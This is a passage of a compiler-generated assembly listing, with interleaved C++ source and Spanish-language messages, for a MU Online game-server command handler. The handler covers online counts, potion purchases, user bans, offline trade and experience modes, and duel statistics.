; 4223 : #ifndef MODIFY_OLD_BUFF_EFFECT_SYSTEM_20071004
; 4224 : 				MsgOutput(aIndex,"Experience Rate: %d(%f)",lpObj->m_wExprienceRate,gAddExperience*(lpObj->m_wExprienceRate/100.0f));
; 4225 : 				MsgOutput(aIndex,"Item Drop Rate: %d(%f)",lpObj->m_wItemDropRate,gItemDropPer*(lpObj->m_wItemDropRate/100.0f));
; 4226 : #endif
; 4227 : 				MsgOutput(aIndex,"Excellent Rate: 1:%d",lpObj->m_wExcellentDropRate);
; 4228 : #ifdef ADD_REWARD_ABOUT_KALIMA_BOSS_01_20040907
; 4229 : 				MsgOutput(aIndex,"Ancient Drop Rate: %d(%f)",lpObj->m_wAncientDropRate,g_GlobalConfig.m_iAncientDrop*(lpObj->m_wAncientDropRate/100.0f));
; 4230 : #endif
; 4231 : 			}
; 4232 : 
; 4233 : 			if(g_VIPSystem.m_bShowMessage && strlen(g_VIPSystem.m_Message) > 0)
; 4234 : 				MsgOutput(aIndex,g_VIPSystem.m_Message);
; 4235 : 		}
; 4236 : 		break;*/
; 4237 : 
; 4238 : 	case GMCMD_ONLINE:
; 4239 : 		{
; 4240 : 			MsgOutput(aIndex,"Usuarios Online: %d/%d", gObjTotalUser, gServerMaxUser);

  035c9	a1 00 00 00 00	 mov	 eax, DWORD PTR ?gServerMaxUser@@3HA ; gServerMaxUser
  035ce	50		 push	 eax
  035cf	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObjTotalUser@@3HA ; gObjTotalUser
  035d5	51		 push	 ecx
  035d6	68 00 00 00 00	 push	 OFFSET ??_C@_0BH@OMKDAPPO@Usuarios?5Online?3?5?$CFd?1?$CFd@
  035db	8b 55 10	 mov	 edx, DWORD PTR _aIndex$[ebp]
  035de	52		 push	 edx
  035df	e8 00 00 00 00	 call	 ?MsgOutput@@YAXHPADZZ	; MsgOutput
  035e4	83 c4 10	 add	 esp, 16			; 00000010H

; 4241 : 		}
; 4242 : 		break;

  035e7	e9 d0 06 00 00	 jmp	 $LN2@Management
$LN286@Management:

; 4243 : 
; 4244 : 	case GMCMD_TIME:
; 4245 : 		{
; 4246 : 			MsgOutput(aIndex,"Tiempo: %s", CTime(time(NULL)).Format("%H:%M:%S"));

  035ec	68 00 00 00 00	 push	 OFFSET ??_C@_08OAHPJFNN@?$CFH?3?$CFM?3?$CFS@
  035f1	8d 85 88 e5 ff
	ff		 lea	 eax, DWORD PTR $T2[ebp]
  035f7	50		 push	 eax
  035f8	6a 00		 push	 0
  035fa	e8 00 00 00 00	 call	 _time
  035ff	83 c4 04	 add	 esp, 4
  03602	52		 push	 edx
  03603	50		 push	 eax
  03604	8d 8d 8c e5 ff
	ff		 lea	 ecx, DWORD PTR $T3[ebp]
  0360a	e8 00 00 00 00	 call	 ??0CTime@ATL@@QAE@_J@Z	; ATL::CTime::CTime
  0360f	8b c8		 mov	 ecx, eax
  03611	e8 00 00 00 00	 call	 ?Format@CTime@ATL@@QBE?AV?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@2@PBD@Z ; ATL::CTime::Format
  03616	89 85 84 e5 ff
	ff		 mov	 DWORD PTR tv2610[ebp], eax
  0361c	8b 8d 84 e5 ff
	ff		 mov	 ecx, DWORD PTR tv2610[ebp]
  03622	89 8d 80 e5 ff
	ff		 mov	 DWORD PTR tv2609[ebp], ecx
  03628	c7 45 fc 00 00
	00 00		 mov	 DWORD PTR __$EHRec$[ebp+8], 0
  0362f	8b 95 80 e5 ff
	ff		 mov	 edx, DWORD PTR tv2609[ebp]
  03635	8b 02		 mov	 eax, DWORD PTR [edx]
  03637	50		 push	 eax
  03638	68 00 00 00 00	 push	 OFFSET ??_C@_0L@EIAKHCAN@Tiempo?3?5?$CFs@
  0363d	8b 4d 10	 mov	 ecx, DWORD PTR _aIndex$[ebp]
  03640	51		 push	 ecx
  03641	e8 00 00 00 00	 call	 ?MsgOutput@@YAXHPADZZ	; MsgOutput
  03646	83 c4 0c	 add	 esp, 12			; 0000000cH
  03649	c7 45 fc ff ff
	ff ff		 mov	 DWORD PTR __$EHRec$[ebp+8], -1
  03650	8d 8d 88 e5 ff
	ff		 lea	 ecx, DWORD PTR $T2[ebp]
  03656	e8 00 00 00 00	 call	 ??1?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@ATL@@QAE@XZ ; ATL::CStringT<char,StrTraitMFC<char,ATL::ChTraitsCRT<char> > >::~CStringT<char,StrTraitMFC<char,ATL::ChTraitsCRT<char> > >

; 4247 : 		}
; 4248 : 		break;

  0365b	e9 5c 06 00 00	 jmp	 $LN2@Management
$LN287@Management:

; 4249 : 
; 4250 : 	case GMCMD_PKCLEAR:
; 4251 : 		{
; 4252 : 			g_PkClearSystem.CheckUserCondition(lpObj);

  03660	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  03663	50		 push	 eax
  03664	b9 00 00 00 00	 mov	 ecx, OFFSET ?g_PkClearSystem@@3VCPkClearSystem@@A ; g_PkClearSystem
  03669	e8 00 00 00 00	 call	 ?CheckUserCondition@CPkClearSystem@@QAEXPAVOBJECTSTRUCT@@@Z ; CPkClearSystem::CheckUserCondition

; 4253 : 		}
; 4254 : 		break;

  0366e	e9 49 06 00 00	 jmp	 $LN2@Management
$LN288@Management:

; 4255 : 
; 4256 : 	case GMCMD_LIFE_POTION:
; 4257 : 		{
; 4258 : 			if(lpObj->Money < g_GlobalConfig.m_iQCommandMoney)

  03673	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  03676	8b 88 b0 00 00
	00		 mov	 ecx, DWORD PTR [eax+176]
  0367c	3b 0d dc 00 00
	00		 cmp	 ecx, DWORD PTR ?g_GlobalConfig@@3VCGlobalConfig@@A+220
  03682	7d 1e		 jge	 SHORT $LN289@Management

; 4259 : 			{
; 4260 : 				MsgOutput(aIndex,"Te falta dinero, Costo: %d", g_GlobalConfig.m_iQCommandMoney);

  03684	a1 dc 00 00 00	 mov	 eax, DWORD PTR ?g_GlobalConfig@@3VCGlobalConfig@@A+220
  03689	50		 push	 eax
  0368a	68 00 00 00 00	 push	 OFFSET ??_C@_0BL@CFOGCENH@Te?5falta?5dinero?0?5Costo?3?5?$CFd@
  0368f	8b 4d 10	 mov	 ecx, DWORD PTR _aIndex$[ebp]
  03692	51		 push	 ecx
  03693	e8 00 00 00 00	 call	 ?MsgOutput@@YAXHPADZZ	; MsgOutput
  03698	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4261 : 				return 0;

  0369b	33 c0		 xor	 eax, eax
  0369d	e9 1c 06 00 00	 jmp	 $LN1@Management
$LN289@Management:

; 4262 : 			}
; 4263 : 
; 4264 : 			CItem item;

  036a2	8d 8d ac f1 ff
	ff		 lea	 ecx, DWORD PTR _item$18[ebp]
  036a8	e8 00 00 00 00	 call	 ??0CItem@@QAE@XZ	; CItem::CItem

; 4265 : 
; 4266 : 			item.Convert(MAKE_ITEMNUM(14,3), 0, 0, 0, 0, 0, 1);

  036ad	6a 01		 push	 1
  036af	6a 00		 push	 0
  036b1	6a 00		 push	 0
  036b3	6a 00		 push	 0
  036b5	6a 00		 push	 0
  036b7	6a 00		 push	 0
  036b9	6a 03		 push	 3
  036bb	6a 0e		 push	 14			; 0000000eH
  036bd	e8 00 00 00 00	 call	 ?MakeItemNumber@@YAHHH@Z ; MakeItemNumber
  036c2	83 c4 08	 add	 esp, 8
  036c5	50		 push	 eax
  036c6	8d 8d ac f1 ff
	ff		 lea	 ecx, DWORD PTR _item$18[ebp]
  036cc	e8 00 00 00 00	 call	 ?Convert@CItem@@QAEXHEEEEEE@Z ; CItem::Convert

; 4267 : 
; 4268 : 			item.m_Durability = 255.0f;

  036d1	f3 0f 10 05 00
	00 00 00	 movss	 xmm0, DWORD PTR __real@437f0000
  036d9	f3 0f 11 85 d0
	f1 ff ff	 movss	 DWORD PTR _item$18[ebp+36], xmm0

; 4269 : 
; 4270 : 			lpObj->Money -= g_GlobalConfig.m_iQCommandMoney;

  036e1	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  036e4	8b 88 b0 00 00
	00		 mov	 ecx, DWORD PTR [eax+176]
  036ea	2b 0d dc 00 00
	00		 sub	 ecx, DWORD PTR ?g_GlobalConfig@@3VCGlobalConfig@@A+220
  036f0	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  036f3	89 8a b0 00 00
	00		 mov	 DWORD PTR [edx+176], ecx

; 4271 : 
; 4272 : 			GCMoneySend(lpObj->m_Index, lpObj->Money);

  036f9	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  036fc	8b 88 b0 00 00
	00		 mov	 ecx, DWORD PTR [eax+176]
  03702	51		 push	 ecx
  03703	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  03706	8b 02		 mov	 eax, DWORD PTR [edx]
  03708	50		 push	 eax
  03709	e8 00 00 00 00	 call	 ?GCMoneySend@@YAXHK@Z	; GCMoneySend
  0370e	83 c4 08	 add	 esp, 8

; 4273 : 
; 4274 : 			gObjShopBuyInventoryInsertItem(lpObj->m_Index, item);

  03711	81 ec a8 00 00
	00		 sub	 esp, 168		; 000000a8H
  03717	b9 2a 00 00 00	 mov	 ecx, 42			; 0000002aH
  0371c	8d b5 ac f1 ff
	ff		 lea	 esi, DWORD PTR _item$18[ebp]
  03722	8b fc		 mov	 edi, esp
  03724	f3 a5		 rep movsd
  03726	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  03729	8b 08		 mov	 ecx, DWORD PTR [eax]
  0372b	51		 push	 ecx
  0372c	e8 00 00 00 00	 call	 ?gObjShopBuyInventoryInsertItem@@YAEHVCItem@@@Z ; gObjShopBuyInventoryInsertItem
  03731	81 c4 ac 00 00
	00		 add	 esp, 172		; 000000acH

; 4275 : 
; 4276 : 			GCItemListSend(lpObj->m_Index);

  03737	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0373a	8b 08		 mov	 ecx, DWORD PTR [eax]
  0373c	51		 push	 ecx
  0373d	e8 00 00 00 00	 call	 ?GCItemListSend@@YAXH@Z	; GCItemListSend
  03742	83 c4 04	 add	 esp, 4

; 4277 : 		}
; 4278 : 		break;

  03745	e9 72 05 00 00	 jmp	 $LN2@Management
$LN290@Management:

; 4279 : 
; 4280 : 	case GMCMD_MANA_POTION:
; 4281 : 		{
; 4282 : 			if(lpObj->Money < g_GlobalConfig.m_iWCommandMoney)

  0374a	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0374d	8b 88 b0 00 00
	00		 mov	 ecx, DWORD PTR [eax+176]
  03753	3b 0d e0 00 00
	00		 cmp	 ecx, DWORD PTR ?g_GlobalConfig@@3VCGlobalConfig@@A+224
  03759	7d 1e		 jge	 SHORT $LN291@Management

; 4283 : 			{
; 4284 : 				MsgOutput(aIndex,"Te falta dinero, Costo: %d", g_GlobalConfig.m_iQCommandMoney);

  0375b	a1 dc 00 00 00	 mov	 eax, DWORD PTR ?g_GlobalConfig@@3VCGlobalConfig@@A+220
  03760	50		 push	 eax
  03761	68 00 00 00 00	 push	 OFFSET ??_C@_0BL@CFOGCENH@Te?5falta?5dinero?0?5Costo?3?5?$CFd@
  03766	8b 4d 10	 mov	 ecx, DWORD PTR _aIndex$[ebp]
  03769	51		 push	 ecx
  0376a	e8 00 00 00 00	 call	 ?MsgOutput@@YAXHPADZZ	; MsgOutput
  0376f	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4285 : 				return 0;

  03772	33 c0		 xor	 eax, eax
  03774	e9 45 05 00 00	 jmp	 $LN1@Management
$LN291@Management:

; 4286 : 			}
; 4287 : 
; 4288 : 			CItem item;

  03779	8d 8d 04 f1 ff
	ff		 lea	 ecx, DWORD PTR _item$17[ebp]
  0377f	e8 00 00 00 00	 call	 ??0CItem@@QAE@XZ	; CItem::CItem

; 4289 : 
; 4290 : 			item.Convert(MAKE_ITEMNUM(14,6), 0, 0, 0, 0, 0, 1);

  03784	6a 01		 push	 1
  03786	6a 00		 push	 0
  03788	6a 00		 push	 0
  0378a	6a 00		 push	 0
  0378c	6a 00		 push	 0
  0378e	6a 00		 push	 0
  03790	6a 06		 push	 6
  03792	6a 0e		 push	 14			; 0000000eH
  03794	e8 00 00 00 00	 call	 ?MakeItemNumber@@YAHHH@Z ; MakeItemNumber
  03799	83 c4 08	 add	 esp, 8
  0379c	50		 push	 eax
  0379d	8d 8d 04 f1 ff
	ff		 lea	 ecx, DWORD PTR _item$17[ebp]
  037a3	e8 00 00 00 00	 call	 ?Convert@CItem@@QAEXHEEEEEE@Z ; CItem::Convert

; 4291 : 
; 4292 : 			item.m_Durability = 255.0f;

  037a8	f3 0f 10 05 00
	00 00 00	 movss	 xmm0, DWORD PTR __real@437f0000
  037b0	f3 0f 11 85 28
	f1 ff ff	 movss	 DWORD PTR _item$17[ebp+36], xmm0

; 4293 : 
; 4294 : 			lpObj->Money -= g_GlobalConfig.m_iWCommandMoney;

  037b8	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  037bb	8b 88 b0 00 00
	00		 mov	 ecx, DWORD PTR [eax+176]
  037c1	2b 0d e0 00 00
	00		 sub	 ecx, DWORD PTR ?g_GlobalConfig@@3VCGlobalConfig@@A+224
  037c7	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  037ca	89 8a b0 00 00
	00		 mov	 DWORD PTR [edx+176], ecx

; 4295 : 
; 4296 : 			GCMoneySend(lpObj->m_Index, lpObj->Money);

  037d0	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  037d3	8b 88 b0 00 00
	00		 mov	 ecx, DWORD PTR [eax+176]
  037d9	51		 push	 ecx
  037da	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  037dd	8b 02		 mov	 eax, DWORD PTR [edx]
  037df	50		 push	 eax
  037e0	e8 00 00 00 00	 call	 ?GCMoneySend@@YAXHK@Z	; GCMoneySend
  037e5	83 c4 08	 add	 esp, 8

; 4297 : 
; 4298 : 			gObjShopBuyInventoryInsertItem(lpObj->m_Index, item);

  037e8	81 ec a8 00 00
	00		 sub	 esp, 168		; 000000a8H
  037ee	b9 2a 00 00 00	 mov	 ecx, 42			; 0000002aH
  037f3	8d b5 04 f1 ff
	ff		 lea	 esi, DWORD PTR _item$17[ebp]
  037f9	8b fc		 mov	 edi, esp
  037fb	f3 a5		 rep movsd
  037fd	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  03800	8b 08		 mov	 ecx, DWORD PTR [eax]
  03802	51		 push	 ecx
  03803	e8 00 00 00 00	 call	 ?gObjShopBuyInventoryInsertItem@@YAEHVCItem@@@Z ; gObjShopBuyInventoryInsertItem
  03808	81 c4 ac 00 00
	00		 add	 esp, 172		; 000000acH

; 4299 : 
; 4300 : 			GCItemListSend(lpObj->m_Index);

  0380e	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  03811	8b 08		 mov	 ecx, DWORD PTR [eax]
  03813	51		 push	 ecx
  03814	e8 00 00 00 00	 call	 ?GCItemListSend@@YAXH@Z	; GCItemListSend
  03819	83 c4 04	 add	 esp, 4

; 4301 : 		}
; 4302 : 		break;

  0381c	e9 9b 04 00 00	 jmp	 $LN2@Management
$LN292@Management:

; 4303 : 
; 4304 : 	case GMCMD_JOINPVP:
; 4305 : 		{
; 4306 : 			g_PvpEvent.ProcessUserRequest(lpObj);

  03821	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  03824	50		 push	 eax
  03825	b9 00 00 00 00	 mov	 ecx, OFFSET ?g_PvpEvent@@3VCEngagePVP@@A ; g_PvpEvent
  0382a	e8 00 00 00 00	 call	 ?ProcessUserRequest@CEngagePVP@@QAEXPAVOBJECTSTRUCT@@@Z ; CEngagePVP::ProcessUserRequest

; 4307 : 		}
; 4308 : 		break;

  0382f	e9 88 04 00 00	 jmp	 $LN2@Management
$LN293@Management:

; 4309 : 
; 4310 : 	case GMCMD_BAN_USER:
; 4311 : 		{
; 4312 : 			pId = this->GetTokenString();

  03834	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  03837	e8 00 00 00 00	 call	 ?GetTokenString@CGMMng@@QAEPADXZ ; CGMMng::GetTokenString
  0383c	89 85 cc fe ff
	ff		 mov	 DWORD PTR _pId$[ebp], eax

; 4313 : 
; 4314 : 			if(pId == NULL)

  03842	83 bd cc fe ff
	ff 00		 cmp	 DWORD PTR _pId$[ebp], 0
  03849	75 07		 jne	 SHORT $LN294@Management

; 4315 : 				return FALSE;

  0384b	33 c0		 xor	 eax, eax
  0384d	e9 6c 04 00 00	 jmp	 $LN1@Management
$LN294@Management:

; 4316 : 
; 4317 : 			int Index = gObjGetIndex(pId);

  03852	8b 85 cc fe ff
	ff		 mov	 eax, DWORD PTR _pId$[ebp]
  03858	50		 push	 eax
  03859	e8 00 00 00 00	 call	 ?gObjGetIndex@@YAHPAD@Z	; gObjGetIndex
  0385e	83 c4 04	 add	 esp, 4
  03861	89 85 00 f1 ff
	ff		 mov	 DWORD PTR _Index$16[ebp], eax

; 4318 : 
; 4319 : 			if(Index == -1)

  03867	83 bd 00 f1 ff
	ff ff		 cmp	 DWORD PTR _Index$16[ebp], -1
  0386e	75 07		 jne	 SHORT $LN295@Management

; 4320 : 				return FALSE;

  03870	33 c0		 xor	 eax, eax
  03872	e9 47 04 00 00	 jmp	 $LN1@Management
$LN295@Management:

; 4321 : 
; 4322 : 			if((gObj[Index].Authority & AUTHORITY_ADMIN) == AUTHORITY_ADMIN || (gObj[Index].Authority & AUTHORITY_EVENT_GM) == AUTHORITY_EVENT_GM)

  03877	69 85 00 f1 ff
	ff a0 1b 00 00	 imul	 eax, DWORD PTR _Index$16[ebp], 7072
  03881	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  03887	8b 94 01 a4 01
	00 00		 mov	 edx, DWORD PTR [ecx+eax+420]
  0388e	83 e2 02	 and	 edx, 2
  03891	75 1c		 jne	 SHORT $LN297@Management
  03893	69 85 00 f1 ff
	ff a0 1b 00 00	 imul	 eax, DWORD PTR _Index$16[ebp], 7072
  0389d	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  038a3	8b 94 01 a4 01
	00 00		 mov	 edx, DWORD PTR [ecx+eax+420]
  038aa	83 e2 20	 and	 edx, 32			; 00000020H
  038ad	74 07		 je	 SHORT $LN296@Management
$LN297@Management:

; 4323 : 				return FALSE;

  038af	33 c0		 xor	 eax, eax
  038b1	e9 08 04 00 00	 jmp	 $LN1@Management
$LN296@Management:

; 4324 : 
; 4325 : 			gObj[Index].Authority = AUTHORITY_DISABLE;

  038b6	69 85 00 f1 ff
	ff a0 1b 00 00	 imul	 eax, DWORD PTR _Index$16[ebp], 7072
  038c0	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  038c6	c7 84 01 a4 01
	00 00 80 00 00
	00		 mov	 DWORD PTR [ecx+eax+420], 128 ; 00000080H

; 4326 : 
; 4327 : 			CloseClient(Index);

  038d1	8b 85 00 f1 ff
	ff		 mov	 eax, DWORD PTR _Index$16[ebp]
  038d7	50		 push	 eax
  038d8	e8 00 00 00 00	 call	 ?CloseClient@@YAXH@Z	; CloseClient
  038dd	83 c4 04	 add	 esp, 4

; 4328 : 
; 4329 : 			LogAddC(LOGC_RED,"Action: Ban User[%s][%s]", gObj[Index].AccountID, gObj[Index].Name);

  038e0	69 85 00 f1 ff
	ff a0 1b 00 00	 imul	 eax, DWORD PTR _Index$16[ebp], 7072
  038ea	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  038f0	8d 54 01 73	 lea	 edx, DWORD PTR [ecx+eax+115]
  038f4	52		 push	 edx
  038f5	69 85 00 f1 ff
	ff a0 1b 00 00	 imul	 eax, DWORD PTR _Index$16[ebp], 7072
  038ff	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  03905	8d 54 01 68	 lea	 edx, DWORD PTR [ecx+eax+104]
  03909	52		 push	 edx
  0390a	68 00 00 00 00	 push	 OFFSET ??_C@_0BJ@CLNEGGOG@Action?3?5Ban?5User?$FL?$CFs?$FN?$FL?$CFs?$FN@
  0390f	6a 02		 push	 2
  03911	ff 15 00 00 00
	00		 call	 DWORD PTR ?LogAddC@@3P6AXEPADZZA ; LogAddC
  03917	83 c4 10	 add	 esp, 16			; 00000010H

; 4330 : 		}
; 4331 : 		break;

  0391a	e9 9d 03 00 00	 jmp	 $LN2@Management
$LN298@Management:

; 4332 : 		case GMCMD_OFFAFK:
; 4333 : 		{
; 4334 : 			OFFSystem.CreateOfflineSystem(aIndex);

  0391f	8b 45 10	 mov	 eax, DWORD PTR _aIndex$[ebp]
  03922	50		 push	 eax
  03923	b9 00 00 00 00	 mov	 ecx, OFFSET ?OFFSystem@@3VCOFFSystem@@A ; OFFSystem
  03928	e8 00 00 00 00	 call	 ?CreateOfflineSystem@COFFSystem@@QAEXH@Z ; COFFSystem::CreateOfflineSystem

; 4335 : 			return TRUE;

  0392d	b8 01 00 00 00	 mov	 eax, 1
  03932	e9 87 03 00 00	 jmp	 $LN1@Management

; 4336 : 		}
; 4337 : 		break;

  03937	e9 80 03 00 00	 jmp	 $LN2@Management
$LN299@Management:

; 4338 : 		case GMCMD_OFFTRADE:
; 4339 : 		{
; 4340 : 			TNotice notice;

  0393c	6a 00		 push	 0
  0393e	8d 8d f0 ef ff
	ff		 lea	 ecx, DWORD PTR _notice$15[ebp]
  03944	e8 00 00 00 00	 call	 ??0TNotice@@QAE@E@Z	; TNotice::TNotice

; 4341 : 			lpObj->OffTradeCredits = 0;

  03949	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0394c	c7 80 9c 1a 00
	00 00 00 00 00	 mov	 DWORD PTR [eax+6812], 0

; 4342 : 	        lpObj->OffTradeZen = 1;

  03956	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  03959	c7 80 98 1a 00
	00 01 00 00 00	 mov	 DWORD PTR [eax+6808], 1

; 4343 : 			notice.MsgOutputAll("[TIENDA ZEN]: %s Activo -> /offzen",lpObj->Name);

  03963	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  03966	83 c0 73	 add	 eax, 115		; 00000073H
  03969	50		 push	 eax
  0396a	68 00 00 00 00	 push	 OFFSET ??_C@_0CD@GMONJFFH@?$FLTIENDA?5ZEN?$FN?3?5?$CFs?5Activo?5?9?$DO?5?1off@
  0396f	8d 8d f0 ef ff
	ff		 lea	 ecx, DWORD PTR _notice$15[ebp]
  03975	51		 push	 ecx
  03976	e8 00 00 00 00	 call	 ?MsgOutputAll@TNotice@@QAAXPADZZ ; TNotice::MsgOutputAll
  0397b	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4344 : 			OFFtrade.CreateOfflinetrade(aIndex);

  0397e	8b 45 10	 mov	 eax, DWORD PTR _aIndex$[ebp]
  03981	50		 push	 eax
  03982	b9 00 00 00 00	 mov	 ecx, OFFSET ?OFFtrade@@3VCOFFtrade@@A ; OFFtrade
  03987	e8 00 00 00 00	 call	 ?CreateOfflinetrade@COFFtrade@@QAEXH@Z ; COFFtrade::CreateOfflinetrade

; 4345 : 			return TRUE;

  0398c	b8 01 00 00 00	 mov	 eax, 1
  03991	e9 28 03 00 00	 jmp	 $LN1@Management

; 4346 : 		}
; 4347 : 		break;

  03996	e9 21 03 00 00	 jmp	 $LN2@Management
$LN300@Management:

; 4348 : 		case GMCMD_OFFEXP:
; 4349 : 		{
; 4350 : 			TNotice notice;

  0399b	6a 00		 push	 0
  0399d	8d 8d e0 ee ff
	ff		 lea	 ecx, DWORD PTR _notice$14[ebp]
  039a3	e8 00 00 00 00	 call	 ??0TNotice@@QAE@E@Z	; TNotice::TNotice

; 4351 : 			OffExp.OffExpStart(aIndex);

  039a8	8b 45 10	 mov	 eax, DWORD PTR _aIndex$[ebp]
  039ab	50		 push	 eax
  039ac	b9 00 00 00 00	 mov	 ecx, OFFSET ?OffExp@@3VcOffExp@@A ; OffExp
  039b1	e8 00 00 00 00	 call	 ?OffExpStart@cOffExp@@QAEXH@Z ; cOffExp::OffExpStart

; 4352 : 			return TRUE;

  039b6	b8 01 00 00 00	 mov	 eax, 1
  039bb	e9 fe 02 00 00	 jmp	 $LN1@Management

; 4353 : 		}
; 4354 : 		break;

  039c0	e9 f7 02 00 00	 jmp	 $LN2@Management
$LN301@Management:

; 4355 : 		case GMCMD_DUELINFO:
; 4356 : 		{
; 4357 : 			//aca va la funcion del comando xD
; 4358 : 		  LPOBJECTSTRUCT lpObj = &gObj[aIndex];

  039c5	69 45 10 a0 1b
	00 00		 imul	 eax, DWORD PTR _aIndex$[ebp], 7072
  039cc	03 05 00 00 00
	00		 add	 eax, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  039d2	89 85 dc ee ff
	ff		 mov	 DWORD PTR _lpObj$13[ebp], eax

; 4359 : 
; 4360 : 	      int DuelWins = Manager.DuelWins(lpObj->Name);

  039d8	8b 85 dc ee ff
	ff		 mov	 eax, DWORD PTR _lpObj$13[ebp]
  039de	83 c0 73	 add	 eax, 115		; 00000073H
  039e1	50		 push	 eax
  039e2	b9 00 00 00 00	 mov	 ecx, OFFSET ?Manager@@3VCManager@@A ; Manager
  039e7	e8 00 00 00 00	 call	 ?DuelWins@CManager@@QAEHPAD@Z ; CManager::DuelWins
  039ec	89 85 d8 ee ff
	ff		 mov	 DWORD PTR _DuelWins$12[ebp], eax

; 4361 : 	      int DuelLoser = Manager.DuelLoser(lpObj->Name);

  039f2	8b 85 dc ee ff
	ff		 mov	 eax, DWORD PTR _lpObj$13[ebp]
  039f8	83 c0 73	 add	 eax, 115		; 00000073H
  039fb	50		 push	 eax
  039fc	b9 00 00 00 00	 mov	 ecx, OFFSET ?Manager@@3VCManager@@A ; Manager
  03a01	e8 00 00 00 00	 call	 ?DuelLoser@CManager@@QAEHPAD@Z ; CManager::DuelLoser
  03a06	89 85 d4 ee ff
	ff		 mov	 DWORD PTR _DuelLoser$11[ebp], eax

; 4362 : 
; 4363 : 	      MsgOutput(aIndex, "[DuelInfo] DuelWins: %d, DuelLoser: %d",DuelWins,DuelLoser);

  03a0c	8b 85 d4 ee ff
	ff		 mov	 eax, DWORD PTR _DuelLoser$11[ebp]
  03a12	50		 push	 eax
  03a13	8b 8d d8 ee ff
	ff		 mov	 ecx, DWORD PTR _DuelWins$12[ebp]
  03a19	51		 push	 ecx
  03a1a	68 00 00 00 00	 push	 OFFSET ??_C@_0CH@LIDNEDCM@?$FLDuelInfo?$FN?5DuelWins?3?5?$CFd?0?5DuelLo@
  03a1f	8b 55 10	 mov	 edx, DWORD PTR _aIndex$[ebp]
  03a22	52		 push	 edx
  03a23	e8 00 00 00 00	 call	 ?MsgOutput@@YAXHPADZZ	; MsgOutput
  03a28	83 c4 10	 add	 esp, 16			; 00000010H

; 4364 : 			return TRUE;

  03a2b	b8 01 00 00 00	 mov	 eax, 1
  03a30	e9 89 02 00 00	 jmp	 $LN1@Management

; 4365 : 		}
; 4366 : 		break;

  03a35	e9 82 02 00 00	 jmp	 $LN2@Management
$LN302@Management:

; 4367 : 		case GMCMD_ATTACK:
; 4368 : 		{
; 4369 : 			TNotice notice;

  03a3a	6a 00		 push	 0
  03a3c	8d 8d c4 ed ff
	ff		 lea	 ecx, DWORD PTR _notice$10[ebp]
  03a42	e8 00 00 00 00	 call	 ??0TNotice@@QAE@E@Z	; TNotice::TNotice

; 4370 : 			OffExp.OffExpStart2(aIndex);

  03a47	8b 45 10	 mov	 eax, DWORD PTR _aIndex$[ebp]
  03a4a	50		 push	 eax
  03a4b	b9 00 00 00 00	 mov	 ecx, OFFSET ?OffExp@@3VcOffExp@@A ; OffExp
  03a50	e8 00 00 00 00	 call	 ?OffExpStart2@cOffExp@@QAEXH@Z ; cOffExp::OffExpStart2

; 4371 : 			notice.MsgOutputAll("[Ataque Automatico]: %s Activo -> /attackon - quedo modo attack",lpObj->Name);

  03a55	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  03a58	83 c0 73	 add	 eax, 115		; 00000073H
  03a5b	50		 push	 eax
  03a5c	68 00 00 00 00	 push	 OFFSET ??_C@_0EA@FCMKAJKK@?$FLAtaque?5Automatico?$FN?3?5?$CFs?5Activo?5@
  03a61	8d 8d c4 ed ff
	ff		 lea	 ecx, DWORD PTR _notice$10[ebp]
  03a67	51		 push	 ecx
  03a68	e8 00 00 00 00	 call	 ?MsgOutputAll@TNotice@@QAAXPADZZ ; TNotice::MsgOutputAll
  03a6d	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4372 : 			return TRUE;

  03a70	b8 01 00 00 00	 mov	 eax, 1
  03a75	e9 44 02 00 00	 jmp	 $LN1@Management

; 4373 : 		}
; 4374 : 		break;

  03a7a	e9 3d 02 00 00	 jmp	 $LN2@Management
$LN303@Management:

; 4375 : 		case GMCMD_NOATTACK:
; 4376 : 		{
; 4377 : 			TNotice notice;

  03a7f	6a 00		 push	 0
  03a81	8d 8d b4 ec ff
	ff		 lea	 ecx, DWORD PTR _notice$9[ebp]
  03a87	e8 00 00 00 00	 call	 ??0TNotice@@QAE@E@Z	; TNotice::TNotice

; 4378 : 			OffExp.OffExpStart3(aIndex);

  03a8c	8b 45 10	 mov	 eax, DWORD PTR _aIndex$[ebp]
